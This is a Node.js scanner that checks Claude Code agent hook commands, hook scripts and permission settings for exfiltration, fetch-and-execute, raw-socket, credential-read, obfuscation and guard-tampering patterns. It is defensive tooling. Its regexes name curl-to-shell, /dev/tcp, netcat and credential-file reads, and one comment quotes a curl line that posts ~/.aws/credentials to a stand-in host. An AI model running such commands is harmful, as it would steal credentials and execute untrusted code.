#!/usr/bin/env node
/**
 * Scan the agent hook surface for malicious or credential-leaking content.
 *
 * Exists because the AWOS `ai-security` audit's AIS-03 check — "hook scripts contain no
 * exfiltration / download-and-execute patterns" — SKIPPED on hops with "no `.claude/hooks/`
 * directory found". hops' hooks live in `scripts/claude-hooks/`, wired from
 * `.claude/settings.json`. The check that matters most never read a single hook.
 *
 * So this scanner resolves the hook surface from settings, never from a directory convention:
 *
 *   1. `.claude/settings.json` and `.claude/settings.local.json` -> every registered
 *      `hooks.<event>[].hooks[].command`.
 *   2. Each command is scanned AS CONTENT (3 of hops' 4 hooks exist only as inline shell
 *      strings, which no linter or reviewer diff-view treats as code), and any repo file the
 *      command references is resolved and scanned too.
 *   3. Every file in a discovered hook directory — whether `.claude/hooks/` or the directory a
 *      registered command actually points at — so an unregistered script sitting next to a
 *      registered one is not invisible.
 *   4. `permissions.allow` / `deny` / `ask` patterns, for credentials pasted into permission
 *      config. A sibling repo's own audit found a production database password there.
 *   5. Enabled plugins and their marketplace sources — advisory, see UNPINNED_ADVISORY below.
 *
 * Deliberately NOT scanned: the rest of `.claude/` (skills, agents, commands). Those legitimately
 * document shell commands in prose, so the same rules there produce noise instead of signal. The
 * hook surface is what executes unattended on a tool event.
 *
 * Deliberately NOT scanned: `.mcp.json`. The MCP pinning check owns it — see W2.1. Two checks
 * reporting the same finding is how one of them gets deleted.
 *
 * Usage:
 *   check-agent-config.mjs [--repo <path>] [--allowlist <file>] [--advisory] [--json]
 *
 * Exit codes: 0 clean or advisory-only, 1 blocking findings, 2 usage/IO error.
 */

import { readFileSync, readdirSync, statSync, existsSync } from "node:fs";
import { createHash } from "node:crypto";
import { join, relative, dirname, basename, resolve, sep } from "node:path";

// Plugin marketplaces are reported, never blocked. Claude Code's marketplace source config has no
// documented ref/commit field, so unlike an MCP image tag or a GitHub action SHA there may be no
// remedy available — and a gate whose finding cannot be fixed is a gate that gets disabled. This
// stays advisory until a pinning mechanism is confirmed to exist.
const UNPINNED_ADVISORY = true;

// ---------------------------------------------------------------------------
// Rules
//
// Every rule here was checked against the six hooks that actually exist in this org (4 in hops, 2
// in hops-mcp) plus `scripts/pre-commit`, which a hops hook reinstalls. Those files are the
// negative control: they must produce zero findings. Three rules were rewritten to keep it that
// way, and the reason is recorded on each — a rule that fires on the repo's own secret-guard is
// worse than no rule, because it teaches the team to ignore the job.
// ---------------------------------------------------------------------------

const SENSITIVE_PATH =
  String.raw`(?:~|\$HOME|/home/[^/\s]+|/Users/[^/\s]+)?/?` +
  String.raw`(?:\.aws/(?:credentials|config)|\.ssh/id_(?:rsa|dsa|ecdsa|ed25519)|\.netrc|\.npmrc` +
  String.raw`|\.docker/config\.json|\.kube/config|\.gnupg|\.env(?!\.example|\.sample|\.template|\.dist)` +
  String.raw`|id_(?:rsa|dsa|ecdsa|ed25519))`;

// Reading a credential path is only suspicious with a verb that moves the bytes somewhere. The
// first version of this rule matched the path alone and flagged block-secrets.sh many times over —
// the secret-guard hook has to name every credential path in order to block it. `readlink` is
// deliberately absent from the verb list for the same reason.
const READ_VERBS =
  String.raw`\b(?:cat|head|tail|less|more|cp|mv|scp|rsync|base64|xxd|od|strings|tar|zip|gzip|openssl|dd|gpg|curl|wget|python3?|node|awk|sed)\b`;

const REMOTE_URL = String.raw`(?:https?|ftp)://[^\s"'|)]+`;

const RULES = [
  {
    id: "fetch-exec",
    severity: "block",
    why: "downloads code and executes it — the hook is an arbitrary-code entry point",
    patterns: [
      new RegExp(String.raw`(?:curl|wget)[^\n|]*\|\s*(?:sudo\s+)?(?:ba|z|k|d)?sh\b`, "i"),
      new RegExp(String.raw`(?:ba|z)sh\s+<\(\s*(?:curl|wget)`, "i"),
      new RegExp(String.raw`eval\s+["'$]*\$\(\s*(?:curl|wget)`, "i"),
      new RegExp(
        String.raw`(?:python3?|node|ruby|perl)\s+-[ce]\s+["'][^\n]*(?:urlopen|requests\.get|fetch\()`,
        "i",
      ),
    ],
  },
  {
    id: "refless-remote-exec",
    severity: "block",
    why: "runs a third party's default branch — no ref means no idea what executes",
    patterns: [
      // git+URL with no @ref after the host/path. A pinned `git+https://...@v1.2.3` passes.
      new RegExp(
        String.raw`(?:uvx|pipx|pip3?)\s+[^\n]*\bgit\+(?:https?|ssh)://(?:(?!@)[^\s"'])+(?=\s|$|["'])`,
        "i",
      ),
      new RegExp(String.raw`\bnpx\s+(?:--yes|-y)\s`, "i"),
      new RegExp(
        String.raw`\b(?:uvx|uv\s+tool\s+run)\s+[^\n]*@(?:latest|canary|next|beta|main|master|HEAD)\b`,
        "i",
      ),
    ],
  },
  {
    id: "exfil-http",
    severity: "block",
    why: "sends a request body to a remote host — the shape of data exfiltration from a hook",
    patterns: [
      new RegExp(
        String.raw`(?:curl|wget)\b[^\n]*(?:\s(?:-d|--data|--data-binary|--data-raw|-F|--form|-T|--upload-file|--post-file)\b)[^\n]*` +
          REMOTE_URL,
        "i",
      ),
      new RegExp(
        String.raw`(?:curl|wget)\b[^\n]*` +
          REMOTE_URL +
          String.raw`[^\n]*\s(?:-d|--data|-F|--form|-T|--upload-file)\b`,
        "i",
      ),
      new RegExp(String.raw`curl\b[^\n]*-X\s*["']?POST`, "i"),
    ],
  },
  {
    id: "exfil-socket",
    severity: "block",
    why: "opens a raw socket to a remote host from a tool-event hook",
    patterns: [
      new RegExp(String.raw`\b(?:nc|ncat|netcat)\s+(?:-[a-zA-Z]+\s+)*[\w.-]+\s+\d{2,5}\b`),
      new RegExp(String.raw`/dev/tcp/`),
      new RegExp(String.raw`\bssh\s+[^\n]*\s(?:cat|tee)\b`),
    ],
  },
  {
    id: "credential-read",
    severity: "block",
    why: "reads a credential path — precisely what the secret-guard hook exists to stop",
    patterns: [
      new RegExp(READ_VERBS + String.raw`[^\n]{0,80}` + SENSITIVE_PATH),
      new RegExp(String.raw`\bsecurity\s+find-(?:generic|internet)-password\b`),
      new RegExp(String.raw`\baws\s+configure\s+get\s+aws_secret_access_key\b`),
      new RegExp(String.raw`\bgcloud\s+auth\s+print-(?:access|identity)-token\b`),
      new RegExp(String.raw`\benv\s*\|\s*(?:grep|curl|nc)\b`),
      new RegExp(String.raw`\bprintenv\b[^\n]*\|\s*(?:curl|nc|wget)\b`),
    ],
  },
  {
    id: "obfuscated-exec",
    severity: "block",
    why: "decodes then executes — hides the payload from every reviewer reading the diff",
    patterns: [
      new RegExp(String.raw`base64\s+(?:-[dD]|--decode)[^\n]*\|\s*(?:ba|z)?sh\b`, "i"),
      new RegExp(String.raw`echo\s+["'][A-Za-z0-9+/=]{40,}["']\s*\|\s*base64`, "i"),
      new RegExp(String.raw`\bxxd\s+-r\s+-p[^\n]*\|\s*(?:ba|z)?sh\b`, "i"),
    ],
  },
  {
    id: "guard-tamper",
    severity: "block",
    why: "disables a committed guard from inside the agent surface it is supposed to guard",
    patterns: [
      // `cp scripts/pre-commit .git/hooks/pre-commit` is a real hops hook that REINSTALLS the
      // guard. Only removal, truncation and redirection over it are tampering, so the verbs are
      // enumerated rather than matching any mention of .git/hooks.
      new RegExp(String.raw`\b(?:rm|unlink|truncate|shred)\b[^\n]*\.git/hooks`),
      new RegExp(String.raw`>\s*\.git/hooks/`),
      new RegExp(String.raw`\bgit\s+config\s+(?:--\w+\s+)*core\.hooksPath`),
      new RegExp(String.raw`\b(?:rm|mv|truncate|shred)\b[^\n]*block-secrets\.sh`),
      new RegExp(String.raw`\bchmod\s+[^\n]*-x[^\n]*(?:block-secrets|pre-commit)`),
      // Command-position only. `scripts/pre-commit` prints the string
      // "commit with: SKIP_SECRETS=1 git commit ..." twice as help text; matching the bare
      // assignment flagged the guard for documenting its own escape hatch.
      new RegExp(String.raw`(?:^|[;&|]\s*|\bexport\s+|\benv\s+)SKIP_SECRETS=1\b`, "m"),
      new RegExp(String.raw`--no-verify\b`),
    ],
  },
  {
    id: "hardcoded-credential",
    severity: "block",
    why: "a live-format credential inside the agent surface, where no secret scanner looks",
    patterns: [
      // Length-anchored on purpose. `scripts/pre-commit` carries its own detector patterns
      // (`AKIA[0-9A-Z]`, `ghp_[a-zA-Z0-9]`, `xoxb-[0-9]`); unanchored versions of these rules
      // flagged the secret scanner for containing the definition of a secret.
      new RegExp(String.raw`\bAKIA[0-9A-Z]{16}\b`),
      new RegExp(String.raw`\bghp_[A-Za-z0-9]{36}\b`),
      new RegExp(String.raw`\bgithub_pat_[A-Za-z0-9_]{40,}\b`),
      new RegExp(String.raw`\bxox[bpaso]-\d{10,}-\d{10,}-[A-Za-z0-9]{20,}\b`),
      new RegExp(String.raw`\bxapp-\d-[A-Z0-9]{9,}-\d{10,}-[a-f0-9]{60,}\b`),
      new RegExp(String.raw`\bGR13[0-9a-zA-Z_-]{20,}\b`),
      new RegExp(String.raw`\bsk-[A-Za-z0-9]{32,}\b`),
      new RegExp(String.raw`\bAIza[0-9A-Za-z_-]{35}\b`),
      new RegExp(String.raw`-----BEGIN\s+(?:RSA|DSA|EC|OPENSSH|PGP)?\s*PRIVATE KEY-----`),
      new RegExp(
        String.raw`\b(?:postgres(?:ql)?|mysql|mongodb(?:\+srv)?|redis|amqp)://[^:\s"']+:[^@\s"']{6,}@`,
      ),
    ],
  },
];

// ---------------------------------------------------------------------------
// Finding
// ---------------------------------------------------------------------------

class Finding {
  constructor({ rule, severity, label, line, why, detail, fingerprint }) {
    Object.assign(this, { rule, severity, label, line, why, detail, fingerprint });
  }

  get blocking() {
    return this.severity === "block";
  }

  toString() {
    const where = this.line ? `${this.label}:${this.line}` : this.label;
    const fp = this.fingerprint ? ` [fp ${this.fingerprint}]` : "";
    const extra = this.detail ? ` — ${this.detail}` : "";
    const mark = this.blocking ? "x" : "-";
    return `  ${mark} ${this.rule}  ${where}${fp}\n      ${this.why}${extra}`;
  }
}

// Never print the matched text: a finding is a report about a credential, not a copy of one.
// Same fingerprint scheme as research/findings/barley-rotation-runbook.md — first 12 hex of
// sha256 — so an owner can match a token they hold without either side pasting it.
const fingerprint = (s) => createHash("sha256").update(s).digest("hex").slice(0, 12);

// ---------------------------------------------------------------------------
// Scanning
// ---------------------------------------------------------------------------

// A line that is entirely a comment cannot execute, so it cannot exfiltrate — and the repo's own
// secret-guard documents the attacks it blocks (`# ... so `cat *.env` ... match`), which is the
// single false positive this scanner produced on the real hooks. Only WHOLE-LINE comments are
// skipped: stripping from the first `#` on a code line would blind the scanner to
// `curl "http://x/#" -d @~/.aws/credentials`, where the `#` is inside a quoted string.
const WHOLE_LINE_COMMENT = /^\s*(?:#|\/\/|\*|<!--)/;

export function scanText(text, label, rules = RULES) {
  const findings = [];
  const lines = text.split("\n");
  for (const rule of rules) {
    for (const pattern of rule.patterns) {
      for (let i = 0; i < lines.length; i++) {
        if (WHOLE_LINE_COMMENT.test(lines[i])) continue;
        const m = lines[i].match(pattern);
        if (!m) continue;
        findings.push(
          new Finding({
            rule: rule.id,
            severity: rule.severity,
            label,
            line: i + 1,
            why: rule.why,
            fingerprint: rule.id === "hardcoded-credential" ? fingerprint(m[0]) : null,
          }),
        );
        break; // first hit per pattern is enough — the reviewer opens the file anyway
      }
    }
  }
  return findings;
}

// ---------------------------------------------------------------------------
// Surface discovery — from settings, never from a directory convention
// ---------------------------------------------------------------------------

function readJson(path) {
  try {
    return JSON.parse(readFileSync(path, "utf8"));
  } catch (err) {
    if (err.code === "ENOENT") return null;
    throw new Error(`${path}: ${err.message}`);
  }
}

function collectHookCommands(settings, settingsLabel) {
  const out = [];
  const hooks = settings?.hooks;
  if (!hooks || typeof hooks !== "object") return out;
  for (const [event, matchers] of Object.entries(hooks)) {
    if (!Array.isArray(matchers)) continue;
    matchers.forEach((matcher, mi) => {
      const entries = Array.isArray(matcher?.hooks) ? matcher.hooks : [];
      entries.forEach((entry, hi) => {
        if (typeof entry?.command !== "string") return;
        out.push({
          command: entry.command,
          label: `${settingsLabel}:hooks.${event}[${mi}].hooks[${hi}].command`,
          event,
        });
      });
    });
  }
  return out;
}

// A registered command may name a script, may be pure inline shell, or may be both. Resolve any
// token that turns out to be a real file in the repo — this is the step whose absence made AIS-03
// skip an entire dimension's most important check.
const EXCLUDED_DIRS = ["node_modules", ".git", "dist", "build", "vendor", "target", ".venv"];

export function resolveReferencedFiles(command, repoRoot) {
  const files = new Set();
  const tokens =
    command.match(
      /[\w./~$-]*[\w.-]+\.(?:sh|bash|zsh|py|mjs|cjs|js|ts|rb|pl)\b|(?:\.\/|\.\.\/|[\w-]+\/)[\w./-]+/g,
    ) || [];
  for (const raw of tokens) {
    const token = raw.replace(/^['"]|['"]$/g, "");
    if (token.startsWith("$") || token.includes("*")) continue;
    // A hook invoking a dependency binary (`./node_modules/.bin/tsc`) is inline shell, not a hook
    // script — resolving into node_modules would scan the dependency tree instead of the surface.
    if (EXCLUDED_DIRS.some((d) => token.split("/").includes(d))) continue;
    const abs = resolve(repoRoot, token);
    // Stay inside the repo: a hook pointing outside it is a finding for a human, not a file to read.
    if (!abs.startsWith(resolve(repoRoot) + sep)) continue;
    try {
      if (statSync(abs).isFile()) files.add(abs);
    } catch {
      /* not a path, just a word that looked like one */
    }
  }
  return [...files];
}

function walkFiles(dir, acc = []) {
  for (const entry of readdirSync(dir, { withFileTypes: true })) {
    const p = join(dir, entry.name);
    if (entry.isDirectory()) walkFiles(p, acc);
    else if (entry.isFile()) acc.push(p);
  }
  return acc;
}

function collectPermissionPatterns(settings, settingsLabel) {
  const out = [];
  const perms = settings?.permissions;
  if (!perms || typeof perms !== "object") return out;
  for (const key of ["allow", "deny", "ask"]) {
    const list = perms[key];
    if (!Array.isArray(list)) continue;
    list.forEach((value, i) => {
      if (typeof value === "string")
        out.push({ value, label: `${settingsLabel}:permissions.${key}[${i}]` });
    });
  }
  return out;
}

export function checkPlugins(settings, settingsLabel) {
  const findings = [];
  const enabled = Object.entries(settings?.enabledPlugins || {})
    .filter(([, on]) => on === true)
    .map(([id]) => id);
  const markets = settings?.extraKnownMarketplaces || {};

  for (const [name, market] of Object.entries(markets)) {
    const source = market?.source || {};
    const pinned = ["ref", "commit", "tag", "rev", "version", "sha"].some((k) => source[k]);
    if (pinned) continue;
    const users = enabled.filter((id) => id.endsWith(`@${name}`));
    findings.push(
      new Finding({
        rule: "unpinned-plugin-marketplace",
        severity: UNPINNED_ADVISORY ? "advise" : "block",
        label: `${settingsLabel}:extraKnownMarketplaces.${name}`,
        why: "marketplace has no ref — plugins install from whatever is on its default branch, and plugins ship hooks, agents and skills",
        detail:
          `source ${source.source || "?"}:${source.repo || source.url || "?"}; ` +
          `${users.length} enabled plugin(s) from it${users.length ? `: ${users.join(", ")}` : ""}`,
      }),
    );
  }
  return findings;
}

// ---------------------------------------------------------------------------
// Repo scan
// ---------------------------------------------------------------------------

export function scanRepo(repoRootArg) {
  const repoRoot = resolve(repoRootArg);
  const findings = [];
  const scanned = [];
  const summary = {
    settingsFiles: 0,
    hooks: 0,
    inlineHooks: 0,
    scriptHooks: 0,
    hookFiles: 0,
    plugins: 0,
  };
  const rel = (p) => relative(repoRoot, p) || p;

  const settingsPaths = [
    join(repoRoot, ".claude", "settings.json"),
    join(repoRoot, ".claude", "settings.local.json"),
  ];

  const hookDirs = new Set();
  const conventional = join(repoRoot, ".claude", "hooks");
  if (existsSync(conventional)) hookDirs.add(conventional);

  const filesToScan = new Set();

  for (const settingsPath of settingsPaths) {
    const settings = readJson(settingsPath);
    if (!settings) continue;
    summary.settingsFiles++;
    const label = rel(settingsPath);

    for (const hook of collectHookCommands(settings, label)) {
      summary.hooks++;
      findings.push(...scanText(hook.command, hook.label));
      const referenced = resolveReferencedFiles(hook.command, repoRoot);
      if (referenced.length) {
        summary.scriptHooks++;
        for (const file of referenced) {
          filesToScan.add(file);
          // Only walk the neighbours when the directory is dedicated to hooks. hops' second hook
          // points at `scripts/pre-commit`, and walking `scripts/` swept in 11 unrelated files —
          // scope the scanner to the hook surface, not to every script in the repo.
          if (/(^|[-_.])hooks?$/i.test(basename(dirname(file)))) hookDirs.add(dirname(file));
        }
      } else {
        summary.inlineHooks++;
      }
    }

    for (const perm of collectPermissionPatterns(settings, label)) {
      findings.push(
        ...scanText(
          perm.value,
          perm.label,
          RULES.filter((r) => r.id === "hardcoded-credential"),
        ),
      );
    }

    summary.plugins += Object.values(settings.enabledPlugins || {}).filter(Boolean).length;
    findings.push(...checkPlugins(settings, label));
  }

  for (const dir of hookDirs) {
    for (const file of walkFiles(dir)) filesToScan.add(file);
  }

  for (const file of [...filesToScan].sort()) {
    let text;
    try {
      text = readFileSync(file, "utf8");
    } catch (err) {
      throw new Error(`${rel(file)}: ${err.message}`);
    }
    if (text.includes("\u0000")) continue; // binary
    summary.hookFiles++;
    scanned.push(rel(file));
    findings.push(...scanText(text, rel(file)));
  }

  const seen = new Set();
  const deduped = findings.filter((f) => {
    const key = `${f.rule}|${f.label}|${f.line}`;
    if (seen.has(key)) return false;
    seen.add(key);
    return true;
  });

  return { findings: deduped, summary, scanned };
}

// ---------------------------------------------------------------------------
// CLI
// ---------------------------------------------------------------------------

function parseArgs(argv) {
  const args = { repo: process.cwd(), allowlist: null, advisory: false, json: false };
  for (let i = 0; i < argv.length; i++) {
    const a = argv[i];
    if (a === "--repo") args.repo = argv[++i];
    else if (a === "--allowlist") args.allowlist = argv[++i];
    else if (a === "--advisory") args.advisory = true;
    else if (a === "--json") args.json = true;
    else if (a === "--help" || a === "-h") args.help = true;
    else throw new Error(`unknown argument: ${a}`);
  }
  if (!args.repo) throw new Error("--repo needs a path");
  return args;
}

function loadAllowlist(path) {
  if (!path) return {};
  const data = readJson(path);
  if (data === null) throw new Error(`allowlist not found: ${path}`);
  return data;
}

export function main(argv) {
  let args;
  try {
    args = parseArgs(argv);
  } catch (err) {
    console.error(`agent-config-scan: ${err.message}`);
    return 2;
  }
  if (args.help) {
    console.log(
      "usage: check-agent-config.mjs [--repo <path>] [--allowlist <file>] [--advisory] [--json]",
    );
    return 0;
  }

  let result, allowed;
  try {
    allowed = loadAllowlist(args.allowlist);
    result = scanRepo(args.repo);
  } catch (err) {
    console.error(`agent-config-scan: ${err.message}`);
    return 2;
  }

  const kept = [];
  const suppressed = [];
  for (const f of result.findings) {
    const key = `${f.rule}@${f.label.split(":")[0]}`;
    if (allowed[key]) suppressed.push({ finding: f, reason: allowed[key], key });
    else kept.push(f);
  }

  if (args.json) {
    console.log(
      JSON.stringify(
        { summary: result.summary, scanned: result.scanned, findings: kept, suppressed },
        null,
        2,
      ),
    );
  } else {
    console.log(`agent-config-scan: ${args.repo}`);
    if (result.summary.settingsFiles === 0) {
      console.log("  no .claude/settings*.json — no agent hook surface in this repo.");
    } else {
      console.log(
        `  ${result.summary.hooks} registered hook(s): ${result.summary.scriptHooks} referencing a script, ` +
          `${result.summary.inlineHooks} inline-only`,
      );
      console.log(`  ${result.summary.hookFiles} file(s) scanned: ${result.scanned.join(", ") || "none"}`);
      console.log(`  ${result.summary.plugins} enabled plugin(s)`);
    }
    for (const s of suppressed) console.log(`  allowlisted: ${s.key} — ${s.reason}`);
    if (kept.length === 0) {
      console.log("  all clear.");
    } else {
      console.log("");
      for (const f of kept) console.log(f.toString());
    }
  }

  const blocking = kept.filter((f) => f.blocking);
  if (blocking.length === 0) {
    if (kept.length && !args.json) console.log("\n  advisory findings only.");
    return 0;
  }
  if (!args.json) {
    console.log(
      `\n  ${blocking.length} blocking finding(s). If one is legitimate, allowlist it with a reason ` +
        `and who confirmed it — do not widen the rule.`,
    );
  }
  return args.advisory ? 0 : 1;
}

if (import.meta.url === `file://${process.argv[1]}`) {
  process.exit(main(process.argv.slice(2)));
}
